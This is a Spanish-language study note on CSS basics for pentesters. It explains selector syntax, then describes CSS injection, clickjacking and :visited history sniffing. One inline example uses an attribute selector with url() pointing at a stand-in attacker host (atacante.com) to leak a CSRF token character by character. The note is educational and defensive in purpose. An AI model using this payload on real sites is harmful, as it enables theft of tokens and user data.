# CSS (Hojas de Estilo en Cascada)

## Qué problema resuelve

CSS (*Cascading Style Sheets*) define la presentación visual de los elementos HTML: colores, tipografías, márgenes, posicionamiento, animaciones. Sin CSS, una página HTML se vería como texto plano sin formato.

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```

La sintaxis sigue siempre el patrón `selector { propiedad: valor; }`, donde el selector puede apuntar a una etiqueta (`p`, `h1`), una clase (`.miClase`) o un identificador único (`#miId`) — los mismos identificadores que se usan en HTML y que JavaScript también puede referenciar.

## Por qué le importa esto a un pentester

A primera vista, CSS parece terreno puramente estético y ajeno a la seguridad. Sin embargo, existen vectores de ataque construidos enteramente sobre CSS:

- **Exfiltración de datos vía CSS (CSS Injection)**: en aplicaciones donde se permite inyectar CSS personalizado pero se filtra JavaScript, es posible usar selectores de atributo (`input[value^="a"] { background: url(http://atacante.com/log?leak=a) }`) para filtrar carácter a carácter el valor de campos sensibles —como tokens CSRF— simplemente observando qué peticiones llegan al servidor del atacante según qué selector "coincide".
- **Clickjacking asistido por CSS**: superponer elementos invisibles (`opacity: 0`, `position: absolute`) sobre una página legítima para engañar al usuario y que haga clic en algo distinto a lo que cree estar pulsando.
- **Detección de estado mediante `:visited`**: técnica histórica para inferir el historial de navegación de un usuario explotando diferencias de estilo entre enlaces visitados y no visitados (mitigada en navegadores modernos, pero ilustrativa de cómo hasta el CSS "inofensivo" puede filtrar información).

Estos vectores suelen aparecer cuando la única defensa de una aplicación frente a inyecciones es bloquear `<script>` y JavaScript, olvidando que CSS también puede ejecutar lógica condicional limitada y realizar peticiones de red (vía `url()`).

## Frameworks CSS

Definir manualmente el estilo de cada elemento es tedioso a escala, por lo que existen frameworks que aportan componentes y estilos predefinidos: Bootstrap, Bulma, Foundation, SASS (un preprocesador que añade variables, anidamiento y funciones a CSS), entre otros.

Desde el punto de vista de reconocimiento, identificar qué framework CSS usa una aplicación (visible normalmente en las clases HTML o en los archivos `.css` cargados) puede dar pistas indirectas sobre la pila tecnológica general y, en algunos casos, sobre versiones desactualizadas con vulnerabilidades conocidas (por ejemplo, en versiones antiguas de ciertos frameworks JS que acompañan a su contraparte CSS).
